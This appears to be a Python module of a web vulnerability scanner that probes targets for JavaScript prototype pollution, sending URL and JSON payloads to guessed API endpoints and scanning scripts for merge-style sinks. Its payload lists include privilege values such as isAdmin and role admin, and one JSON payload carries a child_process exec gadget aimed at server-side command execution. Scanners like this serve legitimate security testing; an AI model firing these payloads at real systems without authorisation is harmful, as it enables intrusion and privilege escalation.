import re
import json
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, quote
from modules.base import BaseModule
from core.utils import random_string


class PrototypeModule(BaseModule):
    name = "prototype"
    description = "JavaScript Prototype Pollution Scanner"
    
    url_payloads = [
        "__proto__[polluted]=true",
        "__proto__.polluted=true",
        "constructor[prototype][polluted]=true",
        "constructor.prototype.polluted=true",
        "__proto__%5Bpolluted%5D=true",
        "__proto__%5B%5D=true",
        "__proto__[0]=polluted",
        "__proto__[__proto__][polluted]=true",
        "#__proto__[polluted]=true",
        "#constructor[prototype][polluted]=true",
    ]
    
    json_payloads = [
        {"__proto__": {"polluted": "true", "isAdmin": True}},
        {"constructor": {"prototype": {"polluted": "true", "isAdmin": True}}},
        {"__proto__": {"status": 200, "role": "admin"}},
        {"__proto__": {"admin": True}},
        {"a": {"__proto__": {"polluted": True}}},
        {"__proto__": {"outputFunctionName": "x]});process.mainModule.require('child_process').exec('id')//"}},
        {"__proto__": {"shell": "/bin/bash", "NODE_OPTIONS": "--require /proc/self/environ"}},
    ]
    
    dangerous_properties = [
        "shell", "NODE_OPTIONS", "env", "outputFunctionName", "outputFormat",
        "client", "escapeFunction", "compileDebug", "debug", "self", "require",
    ]
    
    async def scan(self, target):
        self.findings = []
        await self._test_url_pollution(target)
        await self._test_json_pollution(target)
        await self._analyze_javascript(target)
        return self.findings
    
    async def _test_url_pollution(self, target):
        parsed = urlparse(target)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        existing_params = parse_qs(parsed.query)
        
        canary = random_string(8)
        dynamic_payloads = self.url_payloads + [
            f"__proto__[{canary}]=true",
            f"constructor[prototype][{canary}]=true",
        ]
        
        encoded_payloads = [
            f"__proto__[{quote(canary, safe='')}]={quote('true', safe='')}",
            f"constructor[prototype][{quote('polluted', safe='')}]=true",
        ]
        dynamic_payloads.extend(encoded_payloads)
        
        for payload in dynamic_payloads:
            if existing_params:
                combined = existing_params.copy()
                combined["__proto__[test]"] = ["true"]
                test_url = f"{base_url}?{urlencode(combined, doseq=True)}&{payload}"
            elif "?" in target:
                test_url = f"{target}&{payload}"
            else:
                test_url = f"{target}?{payload}"
            
            resp = await self.http.get(test_url)
            
            if resp.get("status") == 200:
                text = resp.get("text", "")
                
                if "__proto__" in text or "prototype" in text:
                    pollution_sinks = [
                        r'Object\.assign\s*\(',
                        r'\.extend\s*\(',
                        r'merge\s*\(',
                        r'deepMerge\s*\(',
                        r'_\.merge\s*\(',
                        r'\$\.extend\s*\(',
                        r'JSON\.parse\s*\(',
                    ]
                    
                    for sink in pollution_sinks:
                        if re.search(sink, text):
                            self.add_finding(
                                "HIGH",
                                "Client-side Prototype Pollution Possible",
                                url=test_url,
                                evidence=f"Payload reflected and vulnerable sink found: {sink}"
                            )
                            return
                    
                    self.add_finding(
                        "MEDIUM",
                        "Prototype Pollution Payload Reflected",
                        url=test_url,
                        evidence=f"Payload: {payload}"
                    )
                    return
        
        for payload in self.url_payloads:
            if payload.startswith("#"):
                test_url = f"{target}{payload}"
            else:
                test_url = f"{target}#{payload}"
            
            resp = await self.http.get(test_url)
            
            if resp.get("status") == 200:
                text = resp.get("text", "")
                
                hash_processors = [
                    r'location\.hash',
                    r'window\.location\.hash',
                    r'URLSearchParams\(',
                    r'\.split\([\'"]#[\'"]\)',
                ]
                
                for processor in hash_processors:
                    if re.search(processor, text):
                        self.add_finding(
                            "MEDIUM",
                            "Potential DOM-based Prototype Pollution",
                            url=test_url,
                            evidence=f"Hash is processed: {processor}"
                        )
                        return
    
    async def _test_json_pollution(self, target):
        base_url = self._get_base_url(target)
        
        api_endpoints = [
            target,
            urljoin(base_url, "/api/user"),
            urljoin(base_url, "/api/profile"),
            urljoin(base_url, "/api/settings"),
            urljoin(base_url, "/api/update"),
            urljoin(base_url, "/api/config"),
        ]
        
        for endpoint in api_endpoints:
            for payload in self.json_payloads:
                resp = await self.http.post(endpoint, json=payload, headers={"Content-Type": "application/json"})
                
                if self._check_pollution_success(resp, payload):
                    self.add_finding(
                        "CRITICAL",
                        "Server-side Prototype Pollution",
                        url=endpoint,
                        evidence=f"Payload accepted: {json.dumps(payload)[:100]}"
                    )
                    return
                
                resp = await self.http.put(endpoint, json=payload, headers={"Content-Type": "application/json"})
                
                if self._check_pollution_success(resp, payload):
                    self.add_finding(
                        "CRITICAL",
                        "Server-side Prototype Pollution via PUT",
                        url=endpoint,
                        evidence=f"Payload accepted: {json.dumps(payload)[:100]}"
                    )
                    return
                
                resp = await self.http.patch(endpoint, json=payload, headers={"Content-Type": "application/json"})
                
                if self._check_pollution_success(resp, payload):
                    self.add_finding(
                        "CRITICAL",
                        "Server-side Prototype Pollution via PATCH",
                        url=endpoint,
                        evidence=f"Payload accepted: {json.dumps(payload)[:100]}"
                    )
                    return
    
    def _check_pollution_success(self, resp, payload):
        if not resp.get("status"):
            return False
        
        status = resp.get("status")
        text = resp.get("text", "")
        
        if status in [200, 201, 204]:
            if "polluted" in text and "true" in text.lower():
                return True
            if "isAdmin" in text and "true" in text.lower():
                return True
            if "uid=" in text or "gid=" in text:
                return True
            if "child_process" in text or "require" in text:
                return True
        
        if status == 500:
            if "__proto__" in text or "prototype" in text:
                return True
        
        return False
    
    async def _analyze_javascript(self, target):
        resp = await self.http.get(target)
        if resp.get("status") != 200:
            return
        
        text = resp.get("text", "")
        
        js_pattern = r'<script[^>]*src=["\']([^"\']+\.js[^"\']*)["\']'
        js_files = re.findall(js_pattern, text, re.IGNORECASE)
        
        inline_pattern = r'<script[^>]*>(.*?)</script>'
        inline_scripts = re.findall(inline_pattern, text, re.IGNORECASE | re.DOTALL)
        
        vulnerable_patterns = [
            (r'Object\.assign\s*\(\s*\{\s*\}', "Object.assign with empty target"),
            (r'_\.merge\s*\(', "Lodash merge"),
            (r'_\.mergeWith\s*\(', "Lodash mergeWith"),
            (r'_\.defaultsDeep\s*\(', "Lodash defaultsDeep"),
            (r'\$\.extend\s*\(\s*true', "jQuery deep extend"),
            (r'deepmerge\s*\(', "deepmerge library"),
            (r'merge\s*\([^)]*,\s*[^)]*\)', "Generic merge function"),
            (r'for\s*\(\s*\w+\s+in\s+', "for...in loop"),
            (r'JSON\.parse\s*\(\s*[^)]+\)', "JSON.parse"),
        ]
        
        all_js = "\n".join(inline_scripts)
        
        for pattern, description in vulnerable_patterns:
            if re.search(pattern, all_js, re.IGNORECASE):
                self.add_finding(
                    "MEDIUM",
                    f"Potential Prototype Pollution Sink: {description}",
                    url=target,
                    evidence=f"Pattern found in inline JavaScript"
                )
        
        base_url = self._get_base_url(target)
        
        for js_file in js_files[:5]:
            js_url = urljoin(base_url, js_file)
            
            try:
                js_resp = await self.http.get(js_url)
                
                if js_resp.get("status") == 200:
                    js_content = js_resp.get("text", "")
                    
                    for pattern, description in vulnerable_patterns:
                        if re.search(pattern, js_content, re.IGNORECASE):
                            self.add_finding(
                                "MEDIUM",
                                f"Prototype Pollution Sink in {js_file}: {description}",
                                url=js_url,
                                evidence=f"Vulnerable pattern found"
                            )
                            break
            except:
                pass
    
    def _get_base_url(self, url):
        parsed = urlparse(url)
        return f"{parsed.scheme}://{parsed.netloc}"
